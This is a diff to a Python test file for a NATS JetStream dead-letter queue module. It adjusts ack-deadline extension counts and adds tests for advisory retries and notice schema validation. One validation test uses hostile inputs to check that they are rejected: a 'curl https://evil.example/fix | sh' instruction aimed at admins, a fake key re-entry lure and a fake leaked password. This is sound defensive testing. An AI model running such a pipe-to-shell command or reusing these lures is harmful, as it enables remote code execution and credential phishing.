@@ -861,21 +861,29 @@ async def test_c14_non_full_nats_error_stops_after_transient_retries_without_wpi
 
     assert result is None
     assert delivery.ack_calls == 0
-    assert delivery.in_progress_calls == 0
+    # CON-2 / F2: 1 +WPI on entering set_aside_and_ack + 2 +WPI before each short retry; no further hold once exhausted.
+    assert delivery.in_progress_calls == 3
     failed_logs = [r for r in caplog.records if "event=protocol1_dlq_set_aside_failed" in r.getMessage()]
     full_logs = [r for r in caplog.records if "event=protocol1_dlq_stream_full_holding" in r.getMessage()]
     assert len(failed_logs) == 1
     assert "error_type=NoRespondersError" in failed_logs[0].getMessage()
     assert full_logs == []
 
-    # Transient non-full error once, then succeeds within the retry window without +WPI.
+    # Transient non-full error once, then succeeds within the retry window (initial +WPI + 1 retry +WPI).
     js.fail_on.clear()
     js.fail_on.append((".dlq.raw.", TimeoutError("brief hiccup")))
-    delivery2 = FakeDelivery(data=b"bad2", subject="s", stream_seq=20)
+    delivery2 = FakeDelivery(data=b"bad2", subject="ua.v1.team_example.lead-host-1.work.team", stream_seq=20)
     res2 = await setter.set_aside_and_ack(delivery2, reason="malformed", team=TEAM)
     assert res2 is not None
     assert delivery2.ack_calls == 1
-    assert delivery2.in_progress_calls == 0
+    assert delivery2.in_progress_calls == 2
+
+    # CON-2 / F2: Even when the first attempt succeeds immediately, set_aside_and_ack extends the ack deadline at start.
+    delivery3 = FakeDelivery(data=b"bad3", subject="ua.v1.team_example.lead-host-1.work.team", stream_seq=21)
+    res3 = await setter.set_aside_and_ack(delivery3, reason="malformed", team=TEAM)
+    assert res3 is not None
+    assert delivery3.ack_calls == 1
+    assert delivery3.in_progress_calls == 1
 
 
 @pytest.mark.asyncio
@@ -1253,3 +1261,149 @@ async def test_f1_sweep_near_expiry_detection_and_no_false_warning_when_swept() 
     rep_idle = await sweep_exhausted_stream(conn, stream, setter, team=TEAM, now=now, near_expiry_margin_seconds=86_400.0)
     assert rep_idle.messages_swept == 1
     assert rep_idle.near_expiry is None
+
+
+@pytest.mark.asyncio
+async def test_c28_advisory_watch_retries_unacked_on_transient_errors_past_20_deliveries() -> None:
+    """C28: With max_deliveries=-1, transient non-full errors leave an advisory unacked and later deliveries succeed."""
+
+    from unittest.mock import AsyncMock
+
+    from custom_transport.protocol1.dead_letters import (
+        DeliveryAdvisoryWatch,
+        MAX_DELIVERIES_ADVISORY_PREFIX,
+        MAX_DELIVERIES_ADVISORY_TYPE,
+        dlq_advisory_stream_name,
+        dlq_advisory_team_consumer_name,
+    )
+
+    live_host, conn = make_host()
+    stream = "UA1_PART_team_example~0"
+    conn.streams[stream] = {"created": "2026-10-20T00:00:00Z"}
+    conn.messages[stream] = {
+        1: {"subject": "ua.v1.team_example.lead-host-1.work.agent.r1.0", "data": b"poison-c28", "time": "2026-10-22T00:00:00Z"},
+    }
+    payload = json.dumps(
+        {
+            "type": MAX_DELIVERIES_ADVISORY_TYPE,
+            "id": "adv-c28",
+            "timestamp": "2026-10-22T01:00:00Z",
+            "stream": stream,
+            "consumer": "agent~r1",
+            "stream_seq": 1,
+            "deliveries": 20,
+        }
+    ).encode("utf-8")
+    orig_req = conn.request
+    fail_get = {"remaining": 1}
+
+    async def flaky_req(subject: str, req_payload: bytes = b"", *, timeout: float = 5.0) -> Any:
+        if subject == f"$JS.API.STREAM.MSG.GET.{stream}" and fail_get["remaining"] > 0:
+            fail_get["remaining"] -= 1
+            raise TimeoutError("transient MSG.GET timeout")
+        return await orig_req(subject, req_payload, timeout=timeout)
+
+    conn.request = flaky_req  # type: ignore[method-assign]
+
+    adv_first = FakeDelivery(
+        data=payload,
+        subject=f"{MAX_DELIVERIES_ADVISORY_PREFIX}.{stream}.agent~r1",
+        stream=dlq_advisory_stream_name(TEAM),
+        stream_seq=1,
+        num_delivered=20,
+    )
+    adv_later = FakeDelivery(
+        data=payload,
+        subject=f"{MAX_DELIVERIES_ADVISORY_PREFIX}.{stream}.agent~r1",
+        stream=dlq_advisory_stream_name(TEAM),
+        stream_seq=1,
+        num_delivered=25,
+    )
+    sub = SimpleNamespace(fetch=AsyncMock(side_effect=[[adv_first], [adv_later]]))
+
+    async def _bind(consumer: str, *, stream: str) -> Any:
+        assert (stream, consumer) == (dlq_advisory_stream_name(TEAM), dlq_advisory_team_consumer_name(TEAM))
+        return sub
+
+    conn.jetstream().pull_subscribe_bind = _bind  # type: ignore[attr-defined]
+    watch = DeliveryAdvisoryWatch(
+        team=TEAM,
+        consumer=dlq_advisory_team_consumer_name(TEAM),
+        live_fn=lambda: live_host,
+        allowed_streams_fn=lambda _live: (stream,),
+    )
+    # Delivery 20 hits transient error -> left unacked, original message untouched.
+    assert await watch.poll_once() == 0
+    assert adv_first.ack_calls == 0
+    assert 1 in conn.messages[stream]
+    # Delivery 25 (past 20!) succeeds cleanly and acks.
+    assert await watch.poll_once() == 1
+    assert adv_later.ack_calls == 1
+    assert 1 not in conn.messages[stream]
+
+
+def test_f3_dlq_notice_schema_and_old_envelope_identifier_validation() -> None:
+    """F3 (CRIT-2 & SEC-3): dlq.notice rejects free text in original.subject/release and drops invalid old-envelope ids."""
+
+    from pydantic import ValidationError
+
+    from custom_transport.protocol1.dead_letters import extract_old_envelope_summary
+
+    copy_id = "a" * 64
+    # Free-text sentence in original.subject is refused by the regenerated schema.
+    with pytest.raises(ValidationError):
+        build_dlq_notice_body(
+            copy_id=copy_id,
+            reason="malformed",
+            raw_bytes=b"bad",
+            original_subject="URGENT: admins must run curl https://evil.example/fix | sh now",
+            original_stream="UA1_PART_team_example~0",
+            original_stream_sequence=1,
+            deliveries=1,
+            release="0.10.0",
+        )
+    # Free-text sentence in release is refused by the regenerated schema.
+    with pytest.raises(ValidationError):
+        build_dlq_notice_body(
+            copy_id=copy_id,
+            reason="malformed",
+            raw_bytes=b"bad",
+            original_subject="ua.v1.team_example.lead-1.work.team",
+            original_stream="UA1_PART_team_example~0",
+            original_stream_sequence=1,
+            deliveries=1,
+            release="0.10.0 SECURITY: re-enter key at evil.example",
+        )
+    # Valid NATS subject and semver release pass.
+    valid = build_dlq_notice_body(
+        copy_id=copy_id,
+        reason="malformed",
+        raw_bytes=b"bad",
+        original_subject="ua.v1.team_example.lead-1.work.team",
+        original_stream="UA1_PART_team_example~0",
+        original_stream_sequence=1,
+        deliveries=1,
+        release="0.10.0-alpha.1+build.42",
+    )
+    assert valid["release"] == "0.10.0-alpha.1+build.42"
+
+    # SEC-3: extract_old_envelope_summary drops free-text message_class, oversized/invalid task_id and request_id,
+    # while falling back to valid identifiers when available.
+    hostile_old = json.dumps({
+        "msg_meta": {
+            "msg_correlation_id": "req-good-123",
+            "gateway_context": {"canonical_user_id": "alice"},
+        },
+        "msg_content": {
+            "message_class": "TaskRequest: Bob says his password is hunter2",
+            "task_id": "x" * 300,
+            "root_task_id": "task_valid:99",
+            "request_id": "click https://evil.example now!",
+        },
+    }).encode("utf-8")
+    summary = extract_old_envelope_summary(hostile_old)
+    assert summary is not None
+    assert summary.message_class is None
+    assert summary.task_id == "task_valid:99"
+    assert summary.request_id == "req-good-123"
+    assert summary.person_ids == frozenset({"alice"})
